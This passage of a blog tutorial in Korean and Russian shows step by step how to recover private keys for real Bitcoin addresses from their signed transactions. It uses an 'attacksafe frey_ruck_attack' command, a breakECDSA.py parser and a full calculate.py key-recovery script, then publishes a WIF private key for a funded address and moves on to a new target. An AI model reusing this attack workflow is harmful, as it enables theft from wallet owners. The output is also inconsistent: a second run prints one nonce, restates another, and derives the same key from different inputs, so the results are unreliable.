<!-- wp:code -->
<pre class="wp-block-code"><code>./attacksafe -tool frey_ruck_attack -open RawTX.txt -save SecretKey.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":996} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-55-1024x313.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-996"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>우리는 이 공격을 시작했고&nbsp;<code>-tool frey_ruck_attack</code>그 결과는 파일에 저장되었습니다.<code>SecretKey.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>이제 성공적인 결과를 보려면 파일을 엽니다.<code>SecretKey.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":999} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-57-1024x466.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-999"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0xa63d1fe332773809f41bc0d67262088d918a34a71444e30c19424c64b13e6e3c

RawTX = 010000000128231a6d229f0dbea21477c631fd38d8c87159dc59b917bb822c4f593b5fba8e040000006a47304402203458a4ca3bd23a0e255b6c6f579019b1ca112d0f0e2fe4b9635423b9fbee204d0220445065a0df0007cb92c64c775019fb04cfdeb7e5820f61d6b31a52af6e2d091301210273376122cb37be518f8f47085978fda04eb7ced923b00d055b581b6fc2b179ffffffffff010000000000000000046a02585900000000</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><code>"Deployments ECDSA"</code>우리는 비트코인 ​​블록체인 트랜잭션의 치명적인 취약점을 의미하는&nbsp;비문을 봅니다 .</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>SecretKey значение в формате HEX, это и есть наш секретный ключ "K" (NONCE):</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>K = 0xa63d1fe332773809f41bc0d67262088d918a34a71444e30c19424c64b13e6e3c</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2><em>파이썬</em>&nbsp;스크립트&nbsp;로 확인하자<code>point2gen.py</code></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>ECPy</strong></a>&nbsp;타원 곡선 라이브러리를 사용해 봅시다&nbsp;.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>이제 다음을 지정하여 스크립트를 실행해 보겠습니다&nbsp;<code>секретный ключ "K" (NONCE)</code>.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python3 point2gen.py 0xa63d1fe332773809f41bc0d67262088d918a34a71444e30c19424c64b13e6e3c</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1003} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-58-1024x85.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-1003"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>(0x3458a4ca3bd23a0e255b6c6f579019b1ca112d0f0e2fe4b9635423b9fbee204d , 0x8d8650fddf514e1263e18650a0e72c08f20eeb3c34ad0dd13b3792b890d3ca44)</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>EC (secp256k1)&nbsp;</code>시그니처 값으로&nbsp;포인트 좌표 확인<code>R</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R = 0x3458a4ca3bd23a0e255b6c6f579019b1ca112d0f0e2fe4b9635423b9fbee204d
S = 0x445065a0df0007cb92c64c775019fb04cfdeb7e5820f61d6b31a52af6e2d0913
Z = 0x8b65d49dde9949e5ea18ae637d7f4f48c7c3b38957892a94a3bab994fec4eee7</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R          =    0x3458a4ca3bd23a0e255b6c6f579019b1ca112d0f0e2fe4b9635423b9fbee204d
point2gen  =   (0x3458a4ca3bd23a0e255b6c6f579019b1ca112d0f0e2fe4b9635423b9fbee204d , 0x8d8650fddf514e1263e18650a0e72c08f20eeb3c34ad0dd13b3792b890d3ca44)
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><code>ВСЕ ВЕРНО!</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>K = 0xa63d1fe332773809f41bc0d67262088d918a34a71444e30c19424c64b13e6e3c</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>이제 비밀 키를 알고 있으므로 비트코인 ​​지갑에 대한 개인 키를 얻을 수 있습니다.<code>1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2><em>Python</em>&nbsp;스크립트를 사용합시다&nbsp;&nbsp;.&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; 개인 키 가져오기</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>코드를 열고 서명의 모든 값을 추가합시다<code><strong>K, R, S, Z</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0xa63d1fe332773809f41bc0d67262088d918a34a71444e30c19424c64b13e6e3c
R = 0x3458a4ca3bd23a0e255b6c6f579019b1ca112d0f0e2fe4b9635423b9fbee204d
S = 0x445065a0df0007cb92c64c775019fb04cfdeb7e5820f61d6b31a52af6e2d0913
Z = 0x8b65d49dde9949e5ea18ae637d7f4f48c7c3b38957892a94a3bab994fec4eee7


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2>스크립트는 다음 공식을 사용하여 개인 키를 계산합니다.</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>스크립트를 실행해 봅시다:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python3 calculate.py</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1004} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-59.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-1004"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>PrivKey = 4f539d49b23b87697b74e2f508d4260936e5f47856dae5090d4f5bde1b863a82</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">bitaddress를</a></strong>&nbsp;열고&nbsp;다음을 확인합니다.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ADDR: 1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5
WIF:  KysupQsbEPB7cEcUwpTpxdCAMTVLa9RjVtSzFZbrRV5pcNe2fk4Q
HEX:  4f539d49b23b87697b74e2f508d4260936e5f47856dae5090d4f5bde1b863a82</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":824} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/a2.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-824"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:embed {"url":"https://www.blockchain.com/btc/address/1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://www.blockchain.com/btc/address/1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5
</div></figure>
<!-- /wp:embed -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><code>Приватный ключ найден!</code></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":802,"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://www.blockchain.com/btc/address/1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5" target="_blank" rel="noreferrer noopener"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-18-1024x449.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-802"/></a><figcaption class="wp-element-caption"><strong><code>www.blockchain.com/btc/address/1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5</code></strong></figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>BALANCE: $ 677.14</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>BTC 코인을 잃을 수 있는 잠재적인 위협은 비트코인 ​​블록체인 트랜잭션의 치명적인 취약점에 있기 때문에 모든 사람이 항상 소프트웨어를 업데이트하고 검증된 장치만 사용할 것을 강력히 권장합니다.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/tx/e5bb4aba7dc061059ac163e2dd62b4b025454f5db85e4ec65f45edee97d91393" target="_blank" rel="noreferrer noopener">자세한 암호 분석을 통해 e5bb4aba7dc061059ac163e2dd62b4b025454f5db85e4ec65f45edee97d91393</a></strong>&nbsp;에서 동일한 Bitcoin 주소에 대한&nbsp;치명적인 취약점도 발견했습니다.<strong><code>&nbsp;TXID:</code></strong><strong><a href="https://btc1.trezor.io/tx/e5bb4aba7dc061059ac163e2dd62b4b025454f5db85e4ec65f45edee97d91393" target="_blank" rel="noreferrer noopener"></a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>공격을 위한 RawTX 준비</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/address/1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5" target="_blank" rel="noreferrer noopener">1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/e5bb4aba7dc061059ac163e2dd62b4b025454f5db85e4ec65f45edee97d91393"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/e5bb4aba7dc061059ac163e2dd62b4b025454f5db85e4ec65f45edee97d91393
</div></figure>
<!-- /wp:embed --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":851} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-19-1024x95.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-851"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>RawTX = 01000000015369985c4db3fc4fb6b7671a58f4858a20c11922b8a84cecdefd4687f105362a0e0000006c493046022100cda94253bf560fbb22c5dfd6b6d8d2f58d6401bfdca0a7e1dde84e3b2186b0e8022100ab8ea68d18501eee92408390e9fffd5f5a5b029821f09f4a2914b84ad842897501210273376122cb37be518f8f47085978fda04eb7ced923b00d055b581b6fc2b179ffffffffff010000000000000000046a02585900000000
</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2>이제 모든 취약한 트랜잭션에서 모든 R, S, Z 값을 가져와야 합니다.</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>breakECDSA.py 스크립트를 사용해봅시다.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python2 breakECDSA.py 01000000015369985c4db3fc4fb6b7671a58f4858a20c11922b8a84cecdefd4687f105362a0e0000006c493046022100cda94253bf560fbb22c5dfd6b6d8d2f58d6401bfdca0a7e1dde84e3b2186b0e8022100ab8ea68d18501eee92408390e9fffd5f5a5b029821f09f4a2914b84ad842897501210273376122cb37be518f8f47085978fda04eb7ced923b00d055b581b6fc2b179ffffffffff010000000000000000046a02585900000000
</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1006} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-60-1024x252.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-1006"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R = 0xcda94253bf560fbb22c5dfd6b6d8d2f58d6401bfdca0a7e1dde84e3b2186b0e8
S = 0xab8ea68d18501eee92408390e9fffd5f5a5b029821f09f4a2914b84ad8428975
Z = 0x9d568564500c4b9911ccd4dbb3865e0c9129f2697e9a710f575c63f5f22753b1</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>취약한 ECDSA 서명 트랜잭션에서 비밀 키를 얻기 위해 데이터를&nbsp;<code>RawTX</code>텍스트 문서에 추가하고 파일로 저장해 봅시다.<code>RawTX.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>01000000015369985c4db3fc4fb6b7671a58f4858a20c11922b8a84cecdefd4687f105362a0e0000006c493046022100cda94253bf560fbb22c5dfd6b6d8d2f58d6401bfdca0a7e1dde84e3b2186b0e8022100ab8ea68d18501eee92408390e9fffd5f5a5b029821f09f4a2914b84ad842897501210273376122cb37be518f8f47085978fda04eb7ced923b00d055b581b6fc2b179ffffffffff010000000000000000046a02585900000000</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2><code>-tool frey_ruck_attack</code>소프트웨어를 사용하여&nbsp;실행<code>“ATTACKSAFE SOFTWARE”</code></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>./attacksafe -tool frey_ruck_attack -open RawTX.txt -save SecretKey.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1008} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-61-1024x310.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-1008"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>우리는 이 공격을 시작했고&nbsp;<code>-tool frey_ruck_attack</code>그 결과는 파일에 저장되었습니다.<code>SecretKey.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>이제 성공적인 결과를 보려면 파일을 엽니다.<code>SecretKey.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1011} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-62-1024x453.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-1011"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0xfe150813ba57b990dc7bfacbd3f6c8f6c78a3758789628bdb53808a7fb0d8154

RawTX = 01000000015369985c4db3fc4fb6b7671a58f4858a20c11922b8a84cecdefd4687f105362a0e0000006c493046022100cda94253bf560fbb22c5dfd6b6d8d2f58d6401bfdca0a7e1dde84e3b2186b0e8022100ab8ea68d18501eee92408390e9fffd5f5a5b029821f09f4a2914b84ad842897501210273376122cb37be518f8f47085978fda04eb7ced923b00d055b581b6fc2b179ffffffffff010000000000000000046a02585900000000</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><code>"Deployments ECDSA"</code>우리는 비트코인 ​​블록체인 트랜잭션의 치명적인 취약점을 의미하는&nbsp;비문을 봅니다 .</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>SecretKey значение в формате HEX, это и есть наш секретный ключ "K" (NONCE):</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>K = 0xa63d1fe332773809f41bc0d67262088d918a34a71444e30c19424c64b13e6e3c</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2><em>파이썬</em>&nbsp;스크립트&nbsp;로 확인하자<code>point2gen.py</code></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>ECPy</strong></a>&nbsp;타원 곡선 라이브러리를 사용해 봅시다&nbsp;.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>이제 다음을 지정하여 스크립트를 실행해 보겠습니다&nbsp;<code>секретный ключ "K" (NONCE)</code>.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python3 point2gen.py 0xfe150813ba57b990dc7bfacbd3f6c8f6c78a3758789628bdb53808a7fb0d8154</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1015} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-63-1024x94.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-1015"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>(0xcda94253bf560fbb22c5dfd6b6d8d2f58d6401bfdca0a7e1dde84e3b2186b0e8 , 0x8ef495c9057b590ef5437f710ad585bccc4344a48feeeb28c33bff8b7154662)</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>EC (secp256k1)&nbsp;</code>시그니처 값으로&nbsp;포인트 좌표 확인<code>R</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R = 0xcda94253bf560fbb22c5dfd6b6d8d2f58d6401bfdca0a7e1dde84e3b2186b0e8
S = 0xab8ea68d18501eee92408390e9fffd5f5a5b029821f09f4a2914b84ad8428975
Z = 0x9d568564500c4b9911ccd4dbb3865e0c9129f2697e9a710f575c63f5f22753b1</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R          =    0xcda94253bf560fbb22c5dfd6b6d8d2f58d6401bfdca0a7e1dde84e3b2186b0e8
point2gen  =   (0xcda94253bf560fbb22c5dfd6b6d8d2f58d6401bfdca0a7e1dde84e3b2186b0e8 , 0x8ef495c9057b590ef5437f710ad585bccc4344a48feeeb28c33bff8b7154662)
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><code>ВСЕ ВЕРНО!</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>K = 0xfe150813ba57b990dc7bfacbd3f6c8f6c78a3758789628bdb53808a7fb0d8154</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>이제 비밀 키를 알고 있으므로 비트코인 ​​지갑에 대한 개인 키를 얻을 수 있습니다.<code>1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2><em>Python</em>&nbsp;스크립트를 사용합시다&nbsp;&nbsp;.&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; 개인 키 가져오기</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>코드를 열고 서명의 모든 값을 추가합시다<code><strong>K, R, S, Z</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0xfe150813ba57b990dc7bfacbd3f6c8f6c78a3758789628bdb53808a7fb0d8154
R = 0xcda94253bf560fbb22c5dfd6b6d8d2f58d6401bfdca0a7e1dde84e3b2186b0e8
S = 0xab8ea68d18501eee92408390e9fffd5f5a5b029821f09f4a2914b84ad8428975
Z = 0x9d568564500c4b9911ccd4dbb3865e0c9129f2697e9a710f575c63f5f22753b1


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2>스크립트는 다음 공식을 사용하여 개인 키를 계산합니다.</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>스크립트를 실행해 봅시다:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python3 calculate.py</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1017} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-64.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-1017"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>PrivKey = 4f539d49b23b87697b74e2f508d4260936e5f47856dae5090d4f5bde1b863a82</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">bitaddress를</a></strong>&nbsp;열고&nbsp;다음을 확인합니다.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ADDR: 1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5
WIF:  KysupQsbEPB7cEcUwpTpxdCAMTVLa9RjVtSzFZbrRV5pcNe2fk4Q
HEX:  4f539d49b23b87697b74e2f508d4260936e5f47856dae5090d4f5bde1b863a82</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":824} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/a2.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-824"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:embed {"url":"https://www.blockchain.com/btc/address/1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://www.blockchain.com/btc/address/1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5
</div></figure>
<!-- /wp:embed -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><code>Приватный ключ найден!</code></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":802,"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://www.blockchain.com/btc/address/1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5" target="_blank" rel="noreferrer noopener"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-18-1024x449.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-802"/></a><figcaption class="wp-element-caption"><strong><code>www.blockchain.com/btc/address/1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5</code></strong></figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>BALANCE: $ 677.14</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong><code>№3</code></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>자세한 암호 분석을 통해 Bitcoin 주소에서 치명적인 취약점도 발견했습니다.</p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/address/16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2" target="_blank" rel="noreferrer noopener">16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/c393f6b4651ac109cf90476bab878df624a1867c616a8cd69d0710e7676cd6d4"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/c393f6b4651ac109cf90476bab878df624a1867c616a8cd69d0710e7676cd6d4
</div></figure>
<!-- /wp:embed -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/989ba4524367fbaf75e974a5ff2420d48ba32ebedb1416a0a36c3e575be350d6"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/989ba4524367fbaf75e974a5ff2420d48ba32ebedb1416a0a36c3e575be350d6
</div></figure>
<!-- /wp:embed --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":661} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-5.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-661"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":663} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-6.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-663"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>공격을 위한 RawTX 준비</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/address/16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2" target="_blank" rel="noreferrer noopener">16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/c393f6b4651ac109cf90476bab878df624a1867c616a8cd69d0710e7676cd6d4"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
